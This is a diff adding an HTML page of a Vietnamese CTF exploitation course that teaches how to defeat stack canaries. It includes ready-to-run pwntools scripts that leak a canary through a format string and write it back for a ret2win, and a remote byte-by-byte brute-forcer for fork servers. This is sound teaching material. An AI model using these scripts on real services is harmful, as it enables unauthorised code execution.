@@ -1,0 +1,479 @@
+<title>Stack Canary</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(30px,6.5vw,48px);line-height:1.02;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+.frame{font-family:var(--font-mono);font-size:12px;display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.fr{display:grid;grid-template-columns:120px 1fr;gap:8px;border:1px solid var(--line);border-radius:7px;padding:8px 10px;background:var(--surface-2)}
+.fr .o{color:var(--mem);white-space:nowrap}
+.fr.key{background:var(--accent-soft);border-color:var(--accent)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+.brute{background:var(--surface-2);border:1px solid var(--line);border-radius:12px;padding:16px;margin:12px 0;font-family:var(--font-mono);font-size:12.5px}
+.brute .bytes{display:flex;gap:4px;flex-wrap:wrap;margin:10px 0}
+.brute .b{border:1px solid var(--line);border-radius:5px;padding:4px 8px;background:var(--surface);min-width:32px;text-align:center}
+.brute .b.found{background:var(--ok-soft);border-color:var(--ok);font-weight:700}
+.brute .b.testing{background:var(--accent-soft);border-color:var(--accent)}
+.brute button{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--fg);padding:7px 12px;border-radius:8px;cursor:pointer;margin-top:8px}
+.brute .msg{color:var(--mem);margin-top:8px}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 2 · Bài 14</div>
+    <h1>Stack Canary</h1>
+    <p class="sub"><strong>Stack canary</strong> (stack protector) = một giá trị ngẫu nhiên 8 byte đặt ngay <em>trước</em> saved RBP/RIP. Trước khi <code>ret</code>, hàm kiểm tra canary còn nguyên không — overflow ghi đè nó sẽ bị phát hiện → <code>__stack_chk_fail</code> → abort. Bài này: cách <mark>leak</mark> và <mark>brute</mark> canary (byte thấp luôn 0x00), số thật.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Trung bình (Phase 2)</span>
+      <span class="chip"><b>glibc:</b> canary ở fs:0x28</span>
+      <span class="chip"><b>Cần trước:</b> <a href="stack_overflow.html" style="color:inherit">stack overflow</a></span>
+      <span class="chip"><b>Thời lượng:</b> ~45 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Layout</a><a href="#s4">04 Leak & brute</a><a href="#s5">05 Mô phỏng</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Cơ chế:</strong> hàm có buffer lưu <mark>canary</mark> (8 byte ngẫu nhiên, lấy từ <code>fs:0x28</code>) tại <code>[rbp-8]</code>. Prologue copy vào, epilogue so lại — khác → <code>__stack_chk_fail</code> → abort. Byte thấp luôn là <code>0x00</code> (ngăn leak qua strcpy).</p>
+    <p><strong>Vượt:</strong> (1) <mark>leak canary</mark> (fmt %p, overflow-read) rồi ghi lại đúng giá trị khi overflow; (2) <mark>brute</mark> từng byte trên fork server (canary không đổi giữa các fork); (3) <mark>không chạm canary</mark> — chỉ ghi đè con trỏ khác (fmt, index OOB).</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>canary chặn overflow tuyến tính; leak nó (rồi ghi lại) hoặc brute (fork), hoặc tránh chạm nó.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🔎 Nhận diện</span>
+        <p><code>checksec</code> → "Canary found". Hàm có <code>mov rax,fs:0x28; mov [rbp-8],rax</code> (prologue) &amp; <code>sub rax,fs:0x28; jne __stack_chk_fail</code> (epilogue).</p></div>
+      <div class="combat-row"><span class="lab">💧 Leak + ghi lại</span>
+<pre><code># leak canary (fmt %N$p hoặc overflow in ra):
+canary = int(leak, 16)   # byte thấp = 00
+# overflow: pad(canary_offset) + p64(canary) + p64(rbp) + chain
+payload = b"A"*OFF_CANARY + p64(canary) + b"B"*8 + rop</code></pre></div>
+      <div class="combat-row"><span class="lab">🔨 Brute (fork server)</span>
+<pre><code>canary = b"\x00"             # byte đầu
+for pos in range(7):
+  for b in range(256):
+    if sống(pad + canary + bytes([b])):  # không crash = đúng
+      canary += bytes([b]); break
+# 8 byte, ≤256×7 ≈ 1792 lần</code></pre></div>
+      <div class="combat-row"><span class="lab">🧩 Không chạm canary</span>
+        <p>fmt string (ghi GOT/ret không đi qua canary) · OOB index (ghi thẳng ô đích) · ghi đè con trỏ cục bộ. Canary chỉ chặn overflow TUYẾN TÍNH trên stack.</p></div>
+      <div class="combat-row"><span class="lab">⚠️ Nhớ</span>
+        <p>Canary byte thấp = <code>0x00</code> (<code>p64(canary)</code> phải đúng, không thêm null). Fork server: canary KHÔNG đổi giữa fork (brute được). exec lại mỗi lần → canary đổi, brute vô nghĩa.</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Canary = "chim hoàng yến trong hầm mỏ"</h2>
+  <p>Ví von kinh điển: thợ mỏ mang chim hoàng yến xuống hầm — chim chết (do khí độc) báo nguy trước khi người gặp họa. <span class="mem-term">Stack canary</span> tương tự: một giá trị "chim" đặt giữa buffer và saved RIP. Nếu overflow (tràn tuyến tính) ghi đè saved RIP, nó <strong>phải</strong> đi qua canary trước → canary "chết" (bị đổi) → chương trình phát hiện &amp; abort trước khi <code>ret</code> vào địa chỉ độc.</p>
+  <pre><code><span class="c">// prologue (gcc -fstack-protector):</span>
+mov    rax, fs:0x28       <span class="c"># lấy canary từ TLS</span>
+mov    [rbp-8], rax       <span class="c"># lưu vào stack (ngay trước saved rbp)</span>
+<span class="c">// epilogue:</span>
+mov    rax, [rbp-8]
+sub    rax, fs:0x28       <span class="c"># so với canary gốc</span>
+jne    __stack_chk_fail   <span class="c"># khác → abort</span></code></pre>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">stack canary</div><p>8 byte ngẫu nhiên trước saved RIP.</p></div>
+    <div class="card"><div class="term">fs:0x28</div><p>TLS, nơi lưu canary gốc.</p></div>
+    <div class="card"><div class="term">__stack_chk_fail</div><p>Hàm abort khi canary sai.</p></div>
+    <div class="card"><div class="term">byte thấp 0x00</div><p>Chống leak qua chuỗi (null terminator).</p></div>
+    <div class="card"><div class="term">fork server</div><p>Canary không đổi giữa fork → brute được.</p></div>
+    <div class="card"><div class="term">master canary</div><p>Giá trị gốc trong TLS, dùng chung luồng.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Canary chặn gì, không chặn gì</h2>
+  <p>Canary chặn <strong>overflow tuyến tính</strong> (ghi đè từ buffer lan tới saved RIP). Nhưng nó <em>không</em> chặn: ghi tùy ý không đi qua canary (format string, OOB index, UAF), hay leak-rồi-ghi-lại. Vì vậy vượt canary là một trong những bước "điều kiện" quan trọng của Phase 2: biết đề có canary → chọn leak/brute/tránh cho phù hợp, nếu không exploit sẽ abort ngay.</p>
+ </div>
+</section>
+
+<!-- 03 Layout -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / LAYOUT · MỤC LÕI</div>
+  <h2>Vị trí canary trên stack (số thật)</h2>
+  <div class="frame">
+    <div class="fr"><span class="o">rbp-0x40</span><span>buf[0x40] — buffer bạn tràn</span></div>
+    <div class="fr key"><span class="o">rbp-0x08</span><span><b>canary</b> = <code>0x6a3b9f2c1e4d0000</code> (byte thấp 00!)</span></div>
+    <div class="fr"><span class="o">rbp+0x00</span><span>saved rbp</span></div>
+    <div class="fr"><span class="o">rbp+0x08</span><span>saved RIP (đích overflow)</span></div>
+  </div>
+  <p>Để ghi tới saved RIP (overflow <code>0x48</code> byte từ buf), payload phải <strong>ghi lại đúng canary</strong> tại <code>rbp-8</code> (offset <code>0x40</code> − 0 = 0x38 từ buf? tính kỹ):</p>
+  <pre><code>OFF_CANARY = <span class="d">0x40</span> - <span class="d">0x8</span> = <span class="d">0x38</span>   <span class="c"># buf tại rbp-0x40, canary tại rbp-0x08</span>
+<span class="c"># khoảng từ buf tới canary = 0x40 - 0x8 = 0x38</span>
+payload  = b<span class="s">"A"</span>*<span class="d">0x38</span>        <span class="c"># lấp tới ngay trước canary</span>
+payload += p64(canary)       <span class="c"># GHI LẠI canary đúng</span>
+payload += p64(<span class="d">0</span>)            <span class="c"># saved rbp (rác)</span>
+payload += p64(ret_addr)     <span class="c"># saved RIP (đích)</span></code></pre>
+  <div class="note tip"><span class="tag">Byte thấp 00</span>Canary luôn kết thúc byte thấp <code>0x00</code>. Khi leak qua <code>%p</code> thấy <code>0x....00</code> (cuối 00) → đó là canary. <code>p64(canary)</code> tự chứa byte 00 — không được thêm/bớt.</div>
+ </div>
+</section>
+
+<!-- 04 Leak & brute -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / LEAK & BRUTE</div>
+  <h2>Ba đường vượt</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Leak qua format string</h4><p><code>%N$p</code> dò ô canary (cuối 00). Hoặc overflow làm lộ canary ra output (printf buf chưa null-terminate).</p></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Overflow-read (fgets không null)</h4><p>Ghi đè byte null cuối canary bằng non-null → printf in tiếp qua canary → leak. Rồi vòng 2 ghi lại.</p></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Brute trên fork server</h4><p>Canary không đổi giữa các fork → đoán từng byte: byte đúng = không crash. Byte đầu = 00. ~1792 lần.</p></div></div>
+  <div class="note warn"><span class="tag">Fork vs exec</span>Brute CHỈ được khi server <code>fork()</code> (con giữ canary của cha). Nếu <code>exec</code>/restart mỗi kết nối → canary random lại mỗi lần → brute bất khả. Kiểm bằng cách gửi payload giống nhau 2 lần: cùng kết quả → fork.</div>
+ </div>
+</section>
+
+<!-- 05 Mô phỏng -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Brute canary từng byte</h2>
+  <p>Canary bí mật (byte đầu 00). Bấm "Auto brute" để máy dò từng byte bằng oracle crash/sống.</p>
+  <div class="lab">
+    <div class="brute" id="brute">
+      <div>Canary tìm được:</div>
+      <div class="bytes" id="bytes"></div>
+      <button id="autob">⟳ Auto brute 8 byte</button>
+      <button id="resetb" style="color:var(--muted)">↺ reset</button>
+      <div class="msg" id="msg">Byte 0 luôn = 00. Mỗi byte thử ≤256 lần (byte đúng = không crash).</div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Offset canary &amp; nguồn leak</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Offset buf → canary</h4>
+    <pre><code><span class="c"># gdb: xem [rbp-8] so với buf. hoặc cyclic tới khi chạm __stack_chk_fail</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Nhận canary từ leak</h4>
+    <pre><code><span class="c"># giá trị 0x....00 (cuối 00), 8 byte ngẫu nhiên = canary</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Fork hay exec?</h4>
+    <pre><code><span class="c"># gửi cùng payload 2 lần; canary giống → fork (brute được)</span></code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>Leak canary → ghi lại → ROP</h2>
+  <pre><code><span class="c">// vuln.c — gcc vuln.c -o vuln -fstack-protector-all -no-pie</span>
+<span class="c">// printf(buf) rồi gets(buf) — leak canary qua fmt, rồi overflow</span></code></pre>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · leak + ghi lại</button>
+    <button class="tab" data-t="b">B · brute fork</button>
+    <button class="tab" data-t="c">C · pwnld</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — leak canary qua fmt, ghi lại khi overflow, rồi ret2win/ROP.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+<span class="c"># vòng 1: leak canary (dò offset fmt trước — vd %11$p là canary)</span>
+p.sendline(b<span class="s">"%11$p"</span>)
+canary = <span class="k">int</span>(p.recvline().strip(), <span class="d">16</span>)
+<span class="k">assert</span> canary &amp; <span class="d">0xff</span> == <span class="d">0</span>              <span class="c"># byte thấp phải 00</span>
+log.success(<span class="s">f"canary = {hex(canary)}"</span>)
+
+<span class="c"># vòng 2: overflow ghi LẠI canary + chain</span>
+OFF_CANARY = <span class="d">0x38</span>                        <span class="c"># buf → canary</span>
+pop_rdi = <span class="d">0x401263</span>; win = exe.sym.win
+payload  = b<span class="s">"A"</span>*OFF_CANARY
+payload += p64(canary)                     <span class="c"># canary đúng → qua check</span>
+payload += p64(<span class="d">0</span>)                          <span class="c"># saved rbp</span>
+payload += p64(exe.sym.win)                <span class="c"># saved RIP → win</span>
+p.sendline(payload)
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật</span>Offset fmt (<code>%11$</code>) &amp; <code>OFF_CANARY=0x38</code> là của binary mẫu — dò bằng gdb/cyclic. Canary byte thấp PHẢI 00 (assert bắt sai). Nếu leak sai ô → giá trị không kết thúc 00.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — brute canary trên fork server (không có fmt).</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+HOST,PORT = <span class="s">"srv"</span>,<span class="d">1337</span>; OFF_CANARY = <span class="d">0x38</span>
+
+<span class="k">def</span> alive(suffix):
+    <span class="k">try</span>:
+        p = remote(HOST, PORT)
+        p.send(b<span class="s">"A"</span>*OFF_CANARY + suffix)
+        r = p.recv(timeout=<span class="d">1</span>); p.close()
+        <span class="k">return</span> <span class="k">len</span>(r) &gt; <span class="d">0</span>      <span class="c"># còn trả lời = canary đúng</span>
+    <span class="k">except</span>: <span class="k">return</span> <span class="k">False</span>
+
+canary = b<span class="s">"\x00"</span>                       <span class="c"># byte đầu luôn 00</span>
+<span class="k">while</span> <span class="k">len</span>(canary) &lt; <span class="d">8</span>:
+    <span class="k">for</span> b <span class="k">in</span> <span class="k">range</span>(<span class="d">256</span>):
+        <span class="k">if</span> alive(canary + <span class="k">bytes</span>([b])):
+            canary += <span class="k">bytes</span>([b]); log.info(canary.hex()); <span class="k">break</span>
+log.success(<span class="s">f"canary = {canary.hex()}"</span>)
+<span class="c"># → dùng canary trong payload overflow như bản A</span></code></pre>
+<div class="note tip"><span class="tag">Brute</span>Chỉ chạy được trên <b>fork server</b>. ~1792 kết nối (chậm nhưng chắc). Mỗi byte đúng = server không crash (còn gửi output).</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwnld.</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *
+exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>); p = start()
+sl(b<span class="s">"%11$p"</span>); canary = <span class="k">int</span>(rl().strip(), <span class="d">16</span>)
+<span class="k">assert</span> canary &amp; <span class="d">0xff</span> == <span class="d">0</span>
+sl(b<span class="s">"A"</span>*<span class="d">0x38</span> + p64(canary) + p64(<span class="d">0</span>) + p64(exe.sym.win))
+ia()</code></pre>
+<div class="note"><span class="tag">pwnld</span>Giống pwntools; pwnld rút gọn I/O. <code>pwnretry</code> hợp với brute canary.</div>
+  </div>
+
+  <h3>Checklist</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Vẫn abort (stack_chk_fail)</h4><p>Canary ghi lại sai / offset lệch. assert byte thấp 00; kiểm offset.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Brute không hội tụ</h4><p>Không phải fork (canary đổi mỗi lần). Tìm leak thay brute.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Leak ra số không cuối 00</h4><p>Dò nhầm ô fmt. Tìm ô cuối 00.</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">checksec</div><h4>Phát hiện canary</h4><p>"Canary found".</p></div>
+    <div class="card"><div class="term">gdb canary</div><h4>Xem giá trị</h4><p>pwndbg <code>canary</code>.</p></div>
+    <div class="card"><div class="term">cyclic</div><h4>Offset buf→canary</h4><p>Chạm __stack_chk_fail.</p></div>
+    <div class="card"><div class="term">pwnretry</div><h4>Brute</h4><p>Tự lặp kết nối.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi không qua canary</h2>
+  <div class="grid">
+    <div class="card"><h4>stack_chk_fail</h4><p>Canary ghi lại sai. Kiểm offset & giá trị (cuối 00).</p></div>
+    <div class="card"><h4>Brute vô hạn</h4><p>Không fork. Tìm leak khác.</p></div>
+    <div class="card"><h4>Leak sai ô</h4><p>Canary cuối 00. Dò %N$p đúng vị trí.</p></div>
+    <div class="card"><h4>OFF_CANARY lệch</h4><p>buf→canary = size_buf − 8. Kiểm disasm.</p></div>
+    <div class="card"><h4>PIE + canary</h4><p>Cần leak cả canary lẫn PIE base.</p></div>
+    <div class="card"><h4>Không cần qua canary</h4><p>fmt/OOB ghi thẳng đích — bỏ qua canary.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ & NHẬN DIỆN</div>
+  <h2>Chọn đường theo primitive</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Primitive</th><th>Vượt canary bằng</th></tr></thead>
+    <tbody>
+      <tr><td>format string</td><td>Leak canary (%N$p) hoặc ghi thẳng (không qua canary)</td></tr>
+      <tr><td>Fork server + overflow</td><td>Brute từng byte</td></tr>
+      <tr><td>fgets không null-term + printf</td><td>Overflow-read leak</td></tr>
+      <tr><td>OOB index / UAF</td><td>Ghi thẳng đích, không chạm canary</td></tr>
+      <tr><td>Exec lại mỗi lần, không leak</td><td>❌ Rất khó — cần lỗi khác</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">x86 (32-bit)</span>Canary tại <code>gs:0x14</code>, 4 byte, byte thấp 00. Brute 4 byte (≤256×3). Layout tương tự.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐ · Leak + ghi lại</div><p>fmt leak canary, overflow ghi lại, ret2win.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · Brute fork</div><p>Fork server: brute 8 byte canary, rồi overflow.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · Tránh canary</div><p>OOB index ghi thẳng saved RIP, không chạm canary.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">stack canary</div><p>8 byte trước saved RIP.</p></div>
+    <div class="card"><div class="term">fs:0x28</div><p>TLS lưu canary gốc.</p></div>
+    <div class="card"><div class="term">__stack_chk_fail</div><p>Abort khi canary sai.</p></div>
+    <div class="card"><div class="term">byte thấp 00</div><p>Chống leak qua chuỗi.</p></div>
+    <div class="card"><div class="term">fork brute</div><p>Đoán từng byte trên fork server.</p></div>
+    <div class="card"><div class="term">master canary</div><p>Giá trị gốc trong TLS.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
